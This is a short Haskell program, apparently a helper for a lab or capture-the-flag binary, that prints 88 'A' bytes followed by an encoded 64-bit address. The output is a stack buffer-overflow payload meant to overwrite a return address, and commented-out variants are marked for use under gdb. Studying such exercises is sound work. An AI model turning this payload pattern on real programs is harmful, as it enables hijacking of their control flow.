
module Main where

import Data.Binary (encode)
import qualified Data.ByteString.Lazy as BS
-- import Data.ByteString (pack)
import Data.Word (Word64,Word8)


myBinaryPayload :: BS.ByteString
myBinaryPayload = encode (0xe151555555550000 :: Word64)
-- myBinaryPayload = encode  (  0xe151555555555555 :: Word64) -- for open file


caracterOf :: Char
caracterOf = '\x41'

lenghof :: Int
-- lenghof = 87 -- for gdb
          -- > r $(cat a.)
lenghof = 87 -- for openfile

criaString :: Char -> Int -> String
criaString x n | n > 0 = x : criaString x (n - 1)
               | otherwise = x : []

main :: IO ()
main = do
    putStr (criaString caracterOf lenghof)
--    putStr "\x31"
    BS.putStr myBinaryPayload

